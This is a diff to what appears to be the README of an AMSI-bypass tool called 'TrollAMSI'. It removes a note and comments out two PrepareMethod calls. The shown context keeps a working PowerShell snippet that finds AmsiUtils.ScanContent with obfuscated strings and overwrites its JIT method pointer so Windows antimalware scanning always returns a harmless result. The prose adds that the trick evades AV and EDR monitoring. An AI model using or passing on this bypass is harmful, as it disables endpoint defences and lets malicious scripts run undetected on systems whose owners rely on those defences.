@@ -12,8 +12,6 @@ Matt Graeber first introduced the technique to bypass AMSI by using reflection i
     - dynmically: because of the lack of hooked win32 API calls 
 2. Because we are modifying JIT/IL memory which is hard for AV/EDR to monitor or has not been monitored at this point by a lot of vendors
 
-**Note: Technically speaking, PrepareMethod() in both the "raw powershell" and .cs versions should be called (especially for our method 'M') but works without it too**
-
 ```diff
 ! UPDATE 31/05/2024 
 ! For some security products, modify method M to pass in empty argument string c.
@@ -32,8 +30,8 @@ Matt Graeber first introduced the technique to bypass AMSI by using reflection i
 class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
 $o = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent
 $t = [TrollAMSI].GetMethods() | Where-Object Name -eq 'M'
-[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($t.MethodHandle)  
-[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($o.MethodHandle)
+#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($t.MethodHandle)  
+#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($o.MethodHandle)
 [System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$t.MethodHandle.Value + [long]8)),0, [long]$o.MethodHandle.Value + [long]8,1)
 ```
 ### Raw Powershell One-Liner
